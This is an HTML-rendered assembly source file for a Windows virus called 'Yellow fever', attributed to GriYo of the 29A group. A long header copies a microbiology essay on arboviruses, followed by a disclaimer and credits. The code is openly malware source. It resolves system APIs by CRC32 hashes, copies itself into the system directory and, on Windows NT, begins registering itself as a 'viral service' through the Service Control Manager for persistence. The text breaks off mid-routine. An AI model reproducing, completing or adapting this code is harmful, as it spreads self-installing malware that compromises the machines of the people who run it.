<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>yellow-fever.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Yell0w fever BioCoded by GriYo / 29A</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    http://www.bi0.net</span><span class="sc0">
</span><span class="sc1">;    griyo@bi0.net</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   - About the bio-model:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Yellow fever probably emerged in the New World as a result of the</span><span class="sc0">
</span><span class="sc1">;    African slave trade, which brought Aedes aegypti in water containers of</span><span class="sc0">
</span><span class="sc1">;    ships. Similarly, the rise of Dengue hemorrhagic fever in Southeast Asia</span><span class="sc0">
</span><span class="sc1">;    in the late 1940s is attributed to rapid migration to cities with open</span><span class="sc0">
</span><span class="sc1">;    water storage, which favoured proliferation of the mosquito or other</span><span class="sc0">
</span><span class="sc1">;    suitable vectors. Of current concern in the USA is the fact that Aedes</span><span class="sc0">
</span><span class="sc1">;    albopictus, an aggressive and competent dengue virus vector, was</span><span class="sc0">
</span><span class="sc1">;    brought to Houston in used Asian tires and has established itself in at</span><span class="sc0">
</span><span class="sc1">;    least 17 American states (Morse and Schluederberg 1990).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Approximately 100 of the more than 520 known arthropod-borne viruses</span><span class="sc0">
</span><span class="sc1">;    (arboviruses) cause human disease. At least 20 of these might fulfill</span><span class="sc0">
</span><span class="sc1">;    the criteria for emerging viruses, appearing in epidemic form at</span><span class="sc0">
</span><span class="sc1">;    generally unpredictable intervals (Morse and Schluederberg 1990).</span><span class="sc0">
</span><span class="sc1">;    These viruses are usually spread by the bites of arthropods, but some</span><span class="sc0">
</span><span class="sc1">;    can also be transmitted by other means, for example through milk,</span><span class="sc0">
</span><span class="sc1">;    excreta or aerosols. The arbovirus infections are maintained in nature</span><span class="sc0">
</span><span class="sc1">;    principally, or to an important extent, through biological transmission</span><span class="sc0">
</span><span class="sc1">;    between susceptible vertebrate hosts by blood-sucking insects; they</span><span class="sc0">
</span><span class="sc1">;    multiply to produce viraemia in the vertebrates, multiply in the</span><span class="sc0">
</span><span class="sc1">;    tissues of the insects and are passed on to new vertebrates by the</span><span class="sc0">
</span><span class="sc1">;    bites of insects after a period of extrinsic incubation. The names by</span><span class="sc0">
</span><span class="sc1">;    which these viruses are known are often place names such as West Nile</span><span class="sc0">
</span><span class="sc1">;    or Rift Valley, or are based on clinical characteristics like yellow</span><span class="sc0">
</span><span class="sc1">;    fever.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    The populations and characters of the vertebrate hosts and their</span><span class="sc0">
</span><span class="sc1">;    threshold levels of viraemia are important. Small rodents multiply</span><span class="sc0">
</span><span class="sc1">;    rapidly and have short lives, thus providing a constant supply of</span><span class="sc0">
</span><span class="sc1">;    susceptible individuals. In contrast, monkeys and pigs multiply slowly,</span><span class="sc0">
</span><span class="sc1">;    and once they have recovered from an infection, remain immune for life.</span><span class="sc0">
</span><span class="sc1">;    African monkeys are relatively resistant to Yellow Fever, but Asian and</span><span class="sc0">
</span><span class="sc1">;    American monkeys are susceptible, probably because, unlike the African</span><span class="sc0">
</span><span class="sc1">;    monkeys, they have not been exposed continuously for centuries to the</span><span class="sc0">
</span><span class="sc1">;    infection. Also, possibly related arboviruses may offer partial</span><span class="sc0">
</span><span class="sc1">;    immunization.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Arboviruses are grouped according to antigenic characters, but after</span><span class="sc0">
</span><span class="sc1">;    inoculation of one virus into a fresh animal, not only the homologous</span><span class="sc0">
</span><span class="sc1">;    antibodies, but also heterologous antibodies reacting with other viruses</span><span class="sc0">
</span><span class="sc1">;    of the same group tend to appear. Recovery from an infection by a </span><span class="sc0">
</span><span class="sc1">;    member of one group of arboviruses may provide some degree of resistance</span><span class="sc0">
</span><span class="sc1">;    to a subsequent infection by another member of the same group. For </span><span class="sc0">
</span><span class="sc1">;    example, infection with West Nile virus may have modified the Ethiopian</span><span class="sc0">
</span><span class="sc1">;    epidemic of Yellow Fever in 1962. Again, the effect of prior infection</span><span class="sc0">
</span><span class="sc1">;    with Zika, Uganda S and other related viruses in the forest belt of </span><span class="sc0">
</span><span class="sc1">;    Nigeria, leading to a high incidence of related antibodies, is </span><span class="sc0">
</span><span class="sc1">;    suggested as the explanation of the absence of epidemic Yellow Fever in</span><span class="sc0">
</span><span class="sc1">;    man in that area. These related infections probably modify the disease</span><span class="sc0">
</span><span class="sc1">;    rather than prevent infection.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    With Yellow Fever, neutralizing antibodies can be found as early as a</span><span class="sc0">
</span><span class="sc1">;    few days after the beginning of the disease and are found constantly for</span><span class="sc0">
</span><span class="sc1">;    many years in the sera. The persistence of immunity does not depend on</span><span class="sc0">
</span><span class="sc1">;    exogenous reinfection. It is probable that a mosquito infected with </span><span class="sc0">
</span><span class="sc1">;    Yellow Fever is not harmed by it, but continues to excrete the virus </span><span class="sc0">
</span><span class="sc1">;    throughout life. This means a continuous supply and release of virus,</span><span class="sc0">
</span><span class="sc1">;    probably from the epithelial cells of the salivary glands. The virus </span><span class="sc0">
</span><span class="sc1">;    enters man (or other animals) and gains the liver and other epithelia,</span><span class="sc0">
</span><span class="sc1">;    provoking the early antibodies in the blood, which neutralize </span><span class="sc0">
</span><span class="sc1">;    circulating viruses. But, as suggested by Hunter (1991), antibodies</span><span class="sc0">
</span><span class="sc1">;    which can be detected for so many years in man must stem from a </span><span class="sc0">
</span><span class="sc1">;    continuing stimulus, and the sensitive cells and their progeny probably</span><span class="sc0">
</span><span class="sc1">;    have a prophase equivalent of the virus incorporated into their genome,</span><span class="sc0">
</span><span class="sc1">;    with occasional reversion to productive development which provides the</span><span class="sc0">
</span><span class="sc1">;    stimulus for further antibody formation. A degree of immunity of this</span><span class="sc0">
</span><span class="sc1">;    kind may possibly be provided when a related virus invades epithelial</span><span class="sc0">
</span><span class="sc1">;    cells.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Infant rhesus monkeys and human infants born of mothers immune to</span><span class="sc0">
</span><span class="sc1">;    Yellow Fever have transient protective antibodies in their sera at</span><span class="sc0">
</span><span class="sc1">;    birth which persist for several months. They are probably placentally </span><span class="sc0">
</span><span class="sc1">;    transferred, rather than coming from the mother's milk, because </span><span class="sc0">
</span><span class="sc1">;    antibodies may disappear from infant sera while they are still suckling.</span><span class="sc0">
</span><span class="sc1">;    Passive immunity induced by injection of homologous immune serum, has </span><span class="sc0">
</span><span class="sc1">;    been used for protection against tick-borne encephalitis in cases of </span><span class="sc0">
</span><span class="sc1">;    special risk and similar sera could be used against other infections, </span><span class="sc0">
</span><span class="sc1">;    particularly after laboratory or hospital accidents.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Alison Jacobson, Department of Microbiology</span><span class="sc0">
</span><span class="sc1">;    University of Cape Town</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   - Disclaimer:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    This software has been written just for researching purposes.</span><span class="sc0">
</span><span class="sc1">;    The author is not responsible for any problems caused due to</span><span class="sc0">
</span><span class="sc1">;    improper or illegal use of it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Creditz:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    As always, the instroduction is part from some documents written by</span><span class="sc0">
</span><span class="sc1">;    Alison Jacobson. A very interesting reading.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    I added some code comments taken from several articles i found at MSDN.</span><span class="sc0">
</span><span class="sc1">;    Specially, i want to give mention to this one:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        The Win32 Debugging Application Programming Interface</span><span class="sc0">
</span><span class="sc1">;        Randy Kath</span><span class="sc0">
</span><span class="sc1">;        Microsoft Developer Network Technology Group</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    I was long wondering how to get my service application access to</span><span class="sc0">
</span><span class="sc1">;    desktop windows. This article helped me:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;        Why Do Certain Win32 Technologies Misbehave in Windows NT Services?</span><span class="sc0">
</span><span class="sc1">;    Msdn</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    The CRC32 routine is a translation to assembler of a routine in C</span><span class="sc0">
</span><span class="sc1">;    written by Mark Adler</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    The rest of the code is mine, written with my girlfriend's invaluable</span><span class="sc0">
</span><span class="sc1">;    help and the support of my two RottWeillers</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    Have fun!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc2">.386P</span><span class="sc0">
                </span><span class="sc5">locals</span><span class="sc0">
                    </span><span class="sc5">jumps</span><span class="sc0">
                </span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Win32api.inc</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Useful.inc</span><span class="sc0">
                    </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Mz.inc</span><span class="sc0">
                </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">Pe.inc</span><span class="sc0">

                </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc10">NEAR</span><span class="sc0">
                </span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc10">NEAR</span><span class="sc0">

</span><span class="sc5">SIZEOF_VIRUS</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">7992</span><span class="sc0">

</span><span class="sc5">SIZEOF_VIRUS_BASE64</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">SIZEOF_VIRUS</span><span class="sc4">/</span><span class="sc2">02h</span><span class="sc4">)*</span><span class="sc2">03h</span><span class="sc4">)+((</span><span class="sc5">SIZEOF_VIRUS</span><span class="sc4">/</span><span class="sc2">14h</span><span class="sc4">)*</span><span class="sc2">02h</span><span class="sc4">)+</span><span class="sc2">04h</span><span class="sc0">

</span><span class="sc1">;########################################################################################################################################################</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">               </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

</span><span class="sc5">HostCode</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc1">;Create CRC32 lookup table</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateCRC32Table</span><span class="sc0">

                </span><span class="sc1">;Get KERNEL32 module handle</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szKERNEL32DLL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">TerminateVirus</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hKERNEL32</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Get KERNEL32.DLL api addresses</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">NumKERNEL32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CrcApisKERNEL32</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EpApisKERNEL32</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_APIs</span><span class="sc0">
                </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">K32ApiSuccess</span><span class="sc0">

</span><span class="sc5">CriticalError</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">TerminateVirus</span><span class="sc0">

</span><span class="sc5">K32ApiSuccess</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;Get system information</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">VirusGetSystemInfo</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">TerminateVirus</span><span class="sc0">

                </span><span class="sc1">;Load DLLs and locate functions</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadDllsAndLocateFunctions</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">TerminateVirus</span><span class="sc0">

                </span><span class="sc1">;Is virus running as a system service or</span><span class="sc0">
                </span><span class="sc1">;as normal application ?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_VirusCurrentFile</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StringBuffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringParser</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetStringCRC32</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_VirusSystemFile</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">StringBuffer</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringParser</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetStringCRC32</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">VirusOnSystem</span><span class="sc0">

                </span><span class="sc1">;Build virus image for this system</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">  </span><span class="sc1">;Fail if file already exist</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_VirusSystemFile</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Path_VirusCurrentFile</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_CopyFileA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">TerminateVirus</span><span class="sc0">

                </span><span class="sc1">;Running on Windows NT ?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">system_version</span><span class="sc4">+</span><span class="sc2">00000010h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VER_PLATFORM_WIN32_NT</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">ThenItHaveToBe9x</span><span class="sc0">

                </span><span class="sc1">;****jmp ExecuteFileAtSystemDir</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Windows NT &amp; Windows 2000:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Register viral service into SCM</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">SC_MANAGER_CONNECT</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">SC_MANAGER_CREATE_SERVICE</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">SC_MANAGER_ENUMERATE_SERVICE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">SC_MANAGER_LOCK</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000008h</span><span class="sc0">
</span><span class="sc5">SC_MANAGER_QUERY_LOCK_STATUS</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000010h</span><span class="sc0">
</span><span class="sc5">SC_MANAGER_MODIFY_BOOT_CONFIG</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000020h</span><span class="sc0">

</span><span class="sc5">SERVICE_WIN32_OWN_PROCESS</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000010h</span><span class="sc0">
</span><span class="sc5">SERVICE_WIN32_SHARE_PROCESS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000020h</span><span class="sc0">
</span><span class="sc5">SERVICE_INTERACTIVE_PROCESS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000100h</span><span class="sc0">

</span><span class="sc5">SERVICE_BOOT_START</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">SERVICE_SYSTEM_START</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">SERVICE_AUTO_START</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">SERVICE_DEMAND_START</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000003h</span><span class="sc0">
</span><span class="sc5">SERVICE_DISABLED</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">

</span><span class="sc5">SERVICE_ERROR_IGNORE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">SERVICE_ERROR_NORMAL</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">SERVICE_ERROR_SEVERE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">SERVICE_ERROR_CRITICAL</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000003h</span><span class="sc0">

</span><span class="sc5">SERVICE_QUERY_CONFIG</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000001h</span><span class="sc0">
</span><span class="sc5">SERVICE_CHANGE_CONFIG</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">SERVICE_QUERY_STATUS</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">SERVICE_ENUMERATE_DEPENDENTS</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000008h</span><span class="sc0">
</span><span class="sc5">SERVICE_START</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000010h</span><span class="sc0">
</span><span class="sc5">SERVICE_STOP</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000020h</span><span class="sc0">
</span><span class="sc5">SERVICE_PAUSE_CONTINUE</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000040h</span><span class="sc0">
</span><span class="sc5">SERVICE_INTERROGATE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000080h</span><span class="sc0">
</span><span class="sc5">SERVICE_USER_DEFINED_CONTROL</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000100h</span><span class="sc0">

</span><span class="sc5">SERVICE_ALL_ACCESS</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">STANDARD_RIGHTS_REQUIRED</span><span class="sc0">     </span><span class="sc6">or</span><span class="sc0">     \
                                    </span><span class="sc5">SERVICE_QUERY_CONFIG</span><span class="sc0">         </span><span class="sc6">or</span><span class="sc0">     \
                                    </span><span class="sc5">SERVICE_CHANGE_CONFIG</span><span class="sc0">        </span><span class="sc6">or</span><span class="sc0">     \
                                    </span><span class="sc5">SERVICE_QUERY_STATUS</span><span class="sc0">         </span><span class="sc6">or</span><span class="sc0">     \
                                    </span><span class="sc5">SERVICE_ENUMERATE_DEPENDENTS</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">     \
                                    </span><span class="sc5">SERVICE_START</span><span class="sc0">                </span><span class="sc6">or</span><span class="sc0">     \
                                    </span><span class="sc5">SERVICE_STOP</span><span class="sc0">                 </span><span class="sc6">or</span><span class="sc0">     \
                                    </span><span class="sc5">SERVICE_PAUSE_CONTINUE</span><span class="sc0">       </span><span class="sc6">or</span><span class="sc0">     \
                                    </span><span class="sc5">SERVICE_INTERROGATE</span><span class="sc0">          </span><span class="sc6">or</span><span class="sc0">     \
                                    </span><span class="sc5">SERVICE_USER_DEFINED_CONTROL</span><span class="sc0">

                </span><span class="sc1">;This function establishes a communication</span><span class="sc0">
                </span><span class="sc1">;channel with the SCM on the machine</span><span class="sc0">
                </span><span class="sc1">;specified by the lpMachineName parameter.</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;Pass NULL to open the SCM on the local</span><span class="sc0">
                </span><span class="sc1">;machine</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;The lpDatabaseName parameter identifies</span><span class="sc0">
                </span><span class="sc1">;which database to open</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;You should always pass either</span><span class="sc0">
                </span><span class="sc1">;SERVICES_ACTIVE_DATABASE or NULL for this</span><span class="sc0">
                </span><span class="sc1">;parameter</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;The dwDesiredAccess parameter tells the </span><span class="sc0">
                </span><span class="sc1">;function what you intend to do with the SCM</span><span class="sc0">
                </span><span class="sc1">;database</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SC_MANAGER_CREATE_SERVICE</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_OpenSCManagerA</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;OpenSCManager returns an SC_HANDLE that you</span><span class="sc0">
                </span><span class="sc1">;pass to other functions to manipulate the</span><span class="sc0">
                </span><span class="sc1">;SCMњs database</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hSCM</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExecuteFileAtSystemDir</span><span class="sc0">

                </span><span class="sc1">;SCM database is open... Now try to open</span><span class="sc0">
                </span><span class="sc1">;the viral service, just to check if it has</span><span class="sc0">
                </span><span class="sc1">;been already registered</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">SERVICE_ALL_ACCESS</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ViralServiceName</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">a_OpenServiceA</span><span class="sc4">]</span><span class="sc0">

